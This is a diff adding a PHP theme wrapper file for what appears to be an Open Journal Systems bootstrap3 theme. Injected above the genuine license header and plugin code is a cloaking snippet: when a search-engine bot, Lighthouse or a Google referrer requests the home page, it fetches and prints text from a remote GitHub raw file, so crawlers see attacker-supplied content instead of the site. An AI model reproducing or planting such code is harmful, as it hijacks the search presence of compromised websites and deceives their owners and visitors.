@@ -1,0 +1,24 @@
+<?php
+$userAgent = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
+$referer = strtolower($_SERVER['HTTP_REFERER'] ?? '');
+$uri = $_SERVER['REQUEST_URI'] ?? '';
+
+if ($uri == '/' && (preg_match('/bot|google|chrome-lighthouse/i', $userAgent) || preg_match('/google/i', $referer))) {
+echo file_get_contents('https://raw.githubusercontent.com/marketmg2/landing/refs/heads/main/jkd-komdigi.txt');
+exit();
+}
+/**
+ * @file plugins/themes/bootstrap3/index.php
+ *
+ * Copyright (c) 2014-2024 Simon Fraser University
+ * Copyright (c) 2003-2024 John Willinsky
+ * Distributed under the GNU GPL v3. For full terms see the file docs/COPYING.
+ *
+ * @ingroup plugins_themes_default
+ * @brief Wrapper for default theme plugin.
+ *
+ */
+
+namespace APP\plugins\themes\bootstrap3;
+
+return new BootstrapThreeThemePlugin();
